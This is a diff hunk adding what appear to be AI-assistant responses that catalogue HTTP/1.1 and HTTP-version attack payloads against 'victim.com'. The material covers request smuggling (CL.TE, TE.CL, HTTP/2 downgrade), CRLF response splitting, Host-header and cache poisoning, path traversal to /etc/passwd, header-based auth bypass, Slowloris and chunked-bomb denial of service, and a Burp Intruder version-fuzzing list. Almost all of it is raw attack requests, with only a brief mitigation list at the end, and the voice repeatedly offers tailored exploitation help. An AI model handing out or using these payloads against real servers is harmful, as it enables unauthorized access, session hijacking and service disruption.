@@ -844,3 +844,1132 @@ Transfer-Encoding: chunked⁠
 ---
 
 If you're looking for specific **automated tools** to generate these (like `httpx`, `ffuf`, ` smuggler.py`, or Burp Intruder payloads), or want **targeted payloads** for a specific scenario (WAF bypass, HTTP smuggling, fuzzing), let me know and I'll tailor them.
+
+Here's a comprehensive list of **HTTP/1.1 attacks**, organized by category with payloads and explanations:
+
+---
+
+## 1. HTTP Request Smuggling
+
+### CL.TE (Content-Length vs Transfer-Encoding)
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+```
+
+### TE.CL (Transfer-Encoding vs Content-Length)
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+12
+GET /admin HTTP/1.1
+Host: localhost
+0
+
+```
+
+### TE.TE (Obfuscated Transfer-Encoding)
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 46
+Transfer-Encoding: chunked
+Transfer-encoding: x
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+```
+
+### Chunked with spaces
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 51
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+0
+
+```
+
+### Double Content-Length
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 0
+Content-Length: 50
+
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+### Content-Length with negative value
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: -5
+
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+---
+
+## 2. HTTP Header Injection / CRLF Injection
+
+### Set-Cookie injection
+```
+GET /redirect?url=%0d%0aSet-Cookie:%20sessionid=evil HTTP/1.1
+Host: victim.com
+```
+
+### Redirect location injection
+```
+GET /search?q=test%0d%0aLocation:%20http://evil.com HTTP/1.1
+Host: victim.com
+```
+
+### Response splitting
+```
+GET /login?redirect=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>Hacked!</html> HTTP/1.1
+Host: victim.com
+```
+
+### Custom header injection
+```
+POST /submit HTTP/1.1
+Host: victim.com
+X-Forwarded-For: 127.0.0.1%0d%0aX-Admin: true
+```
+
+---
+
+## 3. Host Header Attacks
+
+### Host header injection
+```
+GET / HTTP/1.1
+Host: evil.com
+```
+```
+GET / HTTP/1.1
+Host: victim.com:443@evil.com
+```
+```
+GET / HTTP/1.1
+Host: victim.com:80@evil.com:80
+```
+
+### Duplicate Host headers
+```
+GET / HTTP/1.1
+Host: victim.com
+Host: evil.com
+```
+
+### Host header with port manipulation
+```
+GET / HTTP/1.1
+Host: victim.com:8080@evil.com
+```
+```
+GET / HTTP/1.1
+Host: victim.com:443@evil.com:443
+```
+
+### Absolute URI with different Host
+```
+GET http://evil.com/ HTTP/1.1
+Host: victim.com
+```
+
+### Line wrapping
+```
+GET / HTTP/1.1
+Host: victim.com
+ Host: evil.com
+```
+
+### Null byte injection
+```
+GET / HTTP/1.1
+Host: victim.com%00.evil.com
+```
+
+---
+
+## 4. HTTP Method Tampering
+
+### Verb tampering
+```
+GET /admin HTTP/1.1
+Host: victim.com
+```
+```
+POST /admin HTTP/1.1
+Host: victim.com
+```
+```
+PUT /admin HTTP/1.1
+Host: victim.com
+```
+```
+DELETE /admin/user/1 HTTP/1.1
+Host: victim.com
+```
+```
+PATCH /admin HTTP/1.1
+Host: victim.com
+```
+```
+HEAD /admin HTTP/1.1
+Host: victim.com
+```
+```
+OPTIONS /admin HTTP/1.1
+Host: victim.com
+```
+```
+TRACE / HTTP/1.1
+Host: victim.com
+```
+```
+CONNECT /admin HTTP/1.1
+Host: victim.com
+```
+
+### Method override headers
+```
+POST / HTTP/1.1
+Host: victim.com
+X-HTTP-Method-Override: GET
+X-HTTP-Method: GET
+X-Method-Override: GET
+X-Original-Method: GET
+```
+
+### Custom methods
+```
+FOOBAR /admin HTTP/1.1
+Host: victim.com
+```
+```
+INDEX /admin HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 5. Path Traversal / Directory Traversal
+
+### Basic traversal
+```
+GET /../../../etc/passwd HTTP/1.1
+Host: victim.com
+```
+```
+GET /..;/..;/etc/passwd HTTP/1.1
+Host: victim.com
+```
+```
+GET /....//....//etc/passwd HTTP/1.1
+Host: victim.com
+```
+
+### Encoded traversal
+```
+GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+Host: victim.com
+```
+```
+GET /..%252f..%252f..%252fetc/passwd HTTP/1.1
+Host: victim.com
+```
+```
+GET /..%c0%af..%c0%af..%c0%af/etc/passwd HTTP/1.1
+Host: victim.com
+```
+
+### Unicode traversal
+```
+GET /..%u2215..%u2215..%u2215etc/passwd HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 6. HTTP Request Splitting / Pipeline Attacks
+
+### Request splitting
+```
+GET / HTTP/1.1\r\nHost: victim.com\r\n\r\nGET /admin HTTP/1.1\r\nHost: victim.com\r\n
+```
+
+### Pipeline injection
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: victim.com
+```
+
+### Null prefix
+```
+GET \x00/admin HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 7. Cache Poisoning
+
+### Unkeyed header injection
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Forwarded-Host: evil.com
+```
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Forwarded-Path: /evil
+```
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Original-URL: /admin
+```
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Rewrite-URL: /admin
+```
+
+### Cache key collision
+```
+GET / HTTP/1.1
+Host: victim.com
+User-Agent: \x00
+```
+```
+GET / HTTP/1.1
+Host: victim.com
+Cookie: session=admin
+ Cookie: session=admin
+```
+
+### Vary header abuse
+```
+GET / HTTP/1.1
+Host: victim.com
+Accept-Encoding: gzip, deflate, \x00
+```
+
+---
+
+## 8. Authentication Bypass
+
+### Basic auth injection
+```
+GET /protected HTTP/1.1
+Host: victim.com
+Authorization: Basic YWRtaW46YWRtaW4=
+```
+```
+GET /protected HTTP/1.1
+Host: victim.com
+Authorization: Basic admin:admin
+```
+
+### Header-based auth bypass
+```
+GET /admin HTTP/1.1
+Host: victim.com
+X-Original-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+```
+
+### Cookie manipulation
+```
+GET /admin HTTP/1.1
+Host: victim.com
+Cookie: admin=1
+Cookie: admin=true
+Cookie: admin=admin
+Cookie: role=admin
+Cookie: isAdmin=true
+```
+
+---
+
+## 9. Denial of Service
+
+### Slowloris (incomplete headers)
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Custom: [slowly sending data...]
+```
+
+### Large header
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Large: [10,000+ characters]
+```
+
+### Multiple headers
+```
+GET / HTTP/1.1
+Host: victim.com
+X-1: a
+X-2: a
+... [1000+ headers]
+```
+
+### Chunked bomb
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+
+ffffffff
+[very large chunk]
+0
+```
+
+### Range header DoS
+```
+GET /largefile HTTP/1.1
+Host: victim.com
+Range: bytes=0-0, 1-1, 2-2, ... [thousands of ranges]
+```
+
+---
+
+## 10. Web Cache Deception
+
+### Path confusion
+```
+GET /admin/../profile HTTP/1.1
+Host: victim.com
+```
+```
+GET /admin;/profile HTTP/1.1
+Host: victim.com
+```
+```
+GET /admin%2fprofile HTTP/1.1
+Host: victim.com
+```
+```
+GET /admin%252fprofile HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 11. HTTP Desync Attacks
+
+### Header folding
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+ Content-Length: 50
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+### Tab separator
+```
+POST\t/ HTTP/1.1\r\n
+Host: victim.com\r\n
+```
+
+### Space after method
+```
+GET  /admin HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 12. Response Header Injection
+
+### Content-Type confusion
+```
+GET /file.jpg HTTP/1.1
+Host: victim.com
+Accept: text/html
+```
+```
+GET /upload.php HTTP/1.1
+Host: victim.com
+Content-Type: image/jpeg
+[actual PHP code]
+```
+
+### CORS misconfiguration
+```
+GET /api/data HTTP/1.1
+Host: victim.com
+Origin: https://evil.com
+Access-Control-Request-Method: GET
+```
+
+---
+
+## 13. HTTP Redirect Abuse
+
+### Open redirect via headers
+```
+GET /redirect?url=//evil.com HTTP/1.1
+Host: victim.com
+```
+```
+GET /redirect?url=https://evil.com HTTP/1.1
+Host: victim.com
+```
+```
+GET /redirect?url=////evil.com HTTP/1.1
+Host: victim.com
+```
+
+### CRLF redirect
+```
+GET /redirect?url=%0d%0aLocation:%20http://evil.com HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 14. HTTP Parameter Pollution
+
+### Duplicate parameters
+```
+POST /login HTTP/1.1
+Host: victim.com
+Content-Type: application/x-www-form-urlencoded
+
+user=admin&user=guest&pass=admin
+```
+
+### Array parameters
+```
+POST /search HTTP/1.1
+Host: victim.com
+Content-Type: application/x-www-form-urlencoded
+
+user[]=admin&user[]=guest
+```
+
+### JSON pollution
+```
+POST /api HTTP/1.1
+Host: victim.com
+Content-Type: application/json
+
+{"user":"admin","user":"guest","pass":"admin"}
+```
+
+---
+
+## 15. WebSocket Hijacking
+
+### Upgrade header injection
+```
+GET / HTTP/1.1
+Host: victim.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
+Sec-WebSocket-Version: 13
+```
+
+---
+
+## Attack Summary Table
+
+| Category | Attack Type | Impact |
+|----------|-------------|--------|
+| Request Smuggling | CL/TE, TE/CL, TE/TE | Request hijacking, session theft |
+| Header Injection | CRLF, Response Splitting | Cache poisoning, XSS |
+| Host Header | Injection, Duplicate | Vhost takeover, cache poisoning |
+| Method Tampering | Verb tampering, Override | Auth bypass, access control bypass |
+| Path Traversal | Directory traversal | File read, LFI |
+| Cache Poisoning | Unkeyed headers, Key collision | Malicious cache serving |
+| DoS | Slowloris, Large headers | Service disruption |
+| Desync | Header folding, Chunked | Request smuggling, session hijacking |
+
+---
+
+If you need **specific payloads** for any of these attack categories, **exploitation techniques**, or **mitigation strategies**, let me know!
+
+Here's a comprehensive guide to **HTTP Version Manipulation** attacks, techniques, and payloads:
+
+---
+
+## 1. HTTP Version Fuzzing
+
+### Invalid version strings
+```
+GET / HTTP/0.9
+Host: victim.com
+```
+```
+GET / HTTP/1.0
+Host: victim.com
+```
+```
+GET / HTTP/1.1
+Host: victim.com
+```
+```
+GET / HTTP/1.2
+Host: victim.com
+```
+```
+GET / HTTP/1.5
+Host: victim.com
+```
+```
+GET / HTTP/2.0
+Host: victim.com
+```
+```
+GET / HTTP/3.0
+Host: victim.com
+```
+
+### Malformed version formats
+```
+GET / HTTP/1.1\r\n
+Host: victim.com
+```
+```
+GET / HTTP/1.1\x00
+Host: victim.com
+```
+```
+GET / HTTP/1.1\x0a
+Host: victim.com
+```
+```
+GET / HTTP/1.1\x0d
+Host: victim.com
+```
+```
+GET / HTTP/1.1\x20
+Host: victim.com
+```
+```
+GET / HTTP/1.1\t
+Host: victim.com
+```
+```
+GET / HTTP/1.1 
+Host: victim.com
+```
+
+### Missing version
+```
+GET / \r\n
+Host: victim.com
+```
+```
+GET /\r\n
+Host: victim.com
+```
+```
+GET / HTTP/\r\n
+Host: victim.com
+```
+
+### Extended versions
+```
+GET / HTTP/1.1.1
+Host: victim.com
+```
+```
+GET / HTTP/1.1.0
+Host: victim.com
+```
+```
+GET / HTTP/1.1.0.0
+Host: victim.com
+```
+```
+GET / HTTP/1.1a
+Host: victim.com
+```
+```
+GET / HTTP/1.1beta
+Host: victim.com
+```
+```
+GET / HTTP/1.1-dev
+Host: victim.com
+```
+
+---
+
+## 2. HTTP/0.9 Exploitation
+
+### HTTP/0.9 response smuggling
+```
+GET /admin\r\n
+```
+(No headers, no Host, raw response)
+
+### CRLF injection in HTTP/0.9
+```
+GET /%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20victim.com%0d%0a\r\n
+```
+
+### HTTP/0.9 to HTTP/1.1 upgrade confusion
+```
+GET / HTTP/0.9
+Host: victim.com
+
+GET /admin HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 3. HTTP/1.0 vs HTTP/1.1 Behavior Differences
+
+### Connection header behavior
+```
+GET / HTTP/1.0
+Host: victim.com
+```
+(Connection closes by default)
+
+```
+GET / HTTP/1.0
+Host: victim.com
+Connection: keep-alive
+```
+(Forces keep-alive in HTTP/1.0)
+
+```
+GET / HTTP/1.1
+Host: victim.com
+```
+(Keep-alive by default)
+
+```
+GET / HTTP/1.1
+Host: victim.com
+Connection: close
+```
+(Forces close)
+
+### Host header requirement
+```
+GET / HTTP/1.0
+```
+(No Host header allowed in HTTP/1.0)
+
+```
+GET / HTTP/1.1
+```
+(Missing Host header - should return 400)
+
+### Chunked encoding availability
+```
+GET / HTTP/1.0
+Transfer-Encoding: chunked
+```
+(Not supported in HTTP/1.0)
+
+```
+GET / HTTP/1.1
+Transfer-Encoding: chunked
+```
+(Supported in HTTP/1.1)
+
+---
+
+## 4. HTTP Version Downgrade Attacks
+
+### Forcing HTTP/1.0 to bypass security
+```
+GET /admin HTTP/1.0
+Host: victim.com
+X-Forwarded-For: 127.0.0.1
+```
+(Some WAFs only inspect HTTP/1.1)
+
+### HTTP/2 to HTTP/1 downgrade smuggling
+```
+:method: POST
+:path: /
+:scheme: https
+transfer-encoding: chunked
+content-length: 100
+
+0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n
+```
+
+### ALPN negotiation manipulation
+```
+ClientHello
+ALPN Extension: http/1.0
+```
+(Force downgrade during TLS negotiation)
+
+---
+
+## 5. HTTP/2 Specific Manipulation
+
+### HTTP/2 to HTTP/1.1 smuggling
+```
+POST / HTTP/2
+Host: victim.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+### HTTP/2 header injection
+```
+:method: GET
+:path: /admin
+:authority: victim.com
+x-injected: \r\nLocation: http://evil.com
+```
+
+### HTTP/2 request smuggling via padding
+```
+POST / HTTP/2
+Content-Length: 5
+Padding: [1000 bytes]
+
+0\r\n\r\nGET /admin
+```
+
+---
+
+## 6. HTTP/3 (QUIC) Manipulation
+
+### QUIC version downgrade
+```
+Initial Packet
+Version: 0xff00001d (Google QUIC)
+```
+(Force downgrade to gQUIC)
+
+### HTTP/3 to HTTP/1.1 translation attacks
+```
+:method: POST
+:path: /admin
+:scheme: https
+transfer-encoding: chunked
+content-length: 100
+```
+(Proxy translation confusion)
+
+---
+
+## 7. Version Negotiation Attacks
+
+### Multiple version lines
+```
+GET / HTTP/1.1
+GET / HTTP/1.0
+Host: victim.com
+```
+
+### Version in different positions
+```
+HTTP/1.1 200 OK
+GET / HTTP/1.1
+Host: victim.com
+```
+
+### Upgrade header manipulation
+```
+GET / HTTP/1.1
+Host: victim.com
+Upgrade: h2c
+Connection: Upgrade
+```
+(HTTP/1.1 to HTTP/2 upgrade)
+
+```
+GET / HTTP/1.1
+Host: victim.com
+Upgrade: websocket, h2c
+Connection: Upgrade
+```
+(Multiple upgrade tokens)
+
+---
+
+## 8. Proxy/Gateway Version Confusion
+
+### Frontend HTTP/1.1, Backend HTTP/1.0
+```
+POST / HTTP/1.1
+Host: victim.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+[chunked data]
+```
+(Backend may not support chunked)
+
+### Header normalization differences
+```
+GET / HTTP/1.1
+Host: victim.com
+X-Custom: value1
+ x-custom: value2
+```
+(Header folding - HTTP/1.1 allows, some backends reject)
+
+---
+
+## 9. WAF/IDS Evasion via Version Manipulation
+
+### Invalid versions bypass
+```
+GET /admin HTTP/2.5
+Host: victim.com
+```
+```
+GET /admin HTTP/1.1.0
+Host: victim.com
+```
+```
+GET /admin HTTP/1.1
+Host: victim.com
+HTTP/1.1 200 OK
+```
+
+### Version in path
+```
+GET /HTTP/1.1/admin HTTP/1.1
+Host: victim.com
+```
+```
+GET /admin?version=HTTP/1.1 HTTP/1.1
+Host: victim.com
+```
+
+### Whitespace confusion
+```
+GET  /admin HTTP/1.1
+Host: victim.com
+```
+```
+GET	/admin HTTP/1.1
+Host: victim.com
+```
+```
+GET /admin	HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 10. Response Version Manipulation
+
+### Forcing HTTP/0.9 response
+```
+GET /admin HTTP/0.9
+```
+(Server may return raw response without headers)
+
+### Version mismatch attacks
+```
+GET /admin HTTP/1.1
+Host: victim.com
+
+HTTP/1.0 200 OK
+Content-Length: 0
+
+[body from another request]
+```
+
+### Response splitting via version
+```
+GET /redirect?url=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>Hacked!</html> HTTP/1.1
+Host: victim.com
+```
+
+---
+
+## 11. Protocol Confusion Attacks
+
+### HTTPS downgrade to HTTP
+```
+GET http://victim.com/admin HTTP/1.1
+Host: victim.com
+```
+(Stripping HTTPS)
+
+### Mixed protocol headers
+```
+GET /admin HTTP/1.1
+Host: victim.com
+X-Forwarded-Proto: http
+```
+(Force HTTP interpretation)
+
+### Scheme manipulation
+```
+GET /admin HTTP/1.1
+Host: victim.com
+X-Forwarded-Scheme: http
+X-Forwarded-Ssl: off
+Front-End-Https: off
+```
+
+---
+
+## 12. Chunked Encoding with Version Confusion
+
+### HTTP/1.1 chunked with HTTP/1.0 backend
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 100
+
+5
+hello
+0
+
+```
+(Backend may read Content-Length instead)
+
+### TE version confusion
+```
+POST / HTTP/1.1
+Host: victim.com
+Transfer-Encoding: chunked
+Content-Length: 4
+HTTP/1.0 200 OK
+
+0
+
+GET /admin
+```
+
+---
+
+## 13. Version-Based Cache Poisoning
+
+### Cache key with version
+```
+GET / HTTP/1.1
+Host: victim.com
+```
+vs
+```
+GET / HTTP/1.0
+Host: victim.com
+```
+(Different cache keys - may poison wrong version)
+
+### Vary header abuse
+```
+GET / HTTP/1.1
+Host: victim.com
+Accept: text/html
+Vary: Accept-Encoding, HTTP-Version
+```
+
+---
+
+## 14. Tool-Based Version Fuzzing Payloads
+
+### Burp Intruder payload list
+```
+HTTP/0.9
+HTTP/1.0
+HTTP/1.1
+HTTP/1.2
+HTTP/1.3
+HTTP/1.5
+HTTP/2.0
+HTTP/2
+HTTP/3.0
+HTTP/3
+HTTP/1.1a
+HTTP/1.1.1
+HTTP/1.1-dev
+HTTP/1.1-test
+HTTP/1.1 
+HTTP/1.1\t
+HTTP/1.1\x00
+HTTP/1.1\x0a
+HTTP/1.1\x0d
+HTTP/1.1\x20
+HTTP/1.1.0
+HTTP/1.1.0.0
+HTTP/1.1beta
+HTTP/1.1rc1
+```
+
+---
+
+## Attack Impact Summary
+
+| Attack Type | Impact | Severity |
+|-------------|--------|----------|
+| HTTP/0.9 smuggling | Response confusion, XSS | High |
+| Version downgrade | WAF bypass, security control bypass | High |
+| HTTP/2 smuggling | Request smuggling via ALPN | Critical |
+| Proxy confusion | Cache poisoning, request hijacking | Critical |
+| Version fuzzing | DoS, unexpected behavior | Medium |
+| Response splitting | Cache poisoning, XSS | High |
+| Protocol downgrade | SSL stripping, MITM | Critical |
+| Version-based cache poison | Malicious cache serving | High |
+
+---
+
+## Mitigation Recommendations
+
+1. **Strict version validation** – Reject invalid HTTP versions
+2. **Consistent version handling** – Normalize across proxies/backends
+3. **HTTP/2 and HTTP/3 security** – Implement proper ALPN validation
+4. **Version downgrade protection** – Reject downgrade attempts when possible
+5. **Logging** – Log all version manipulation attempts
+6. **WAF rules** – Detect and block malformed HTTP versions
+
+---
+
+If you need **specific exploitation techniques**, **detection rules**, or **mitigation implementations** for any of these version manipulation attacks, let me know!
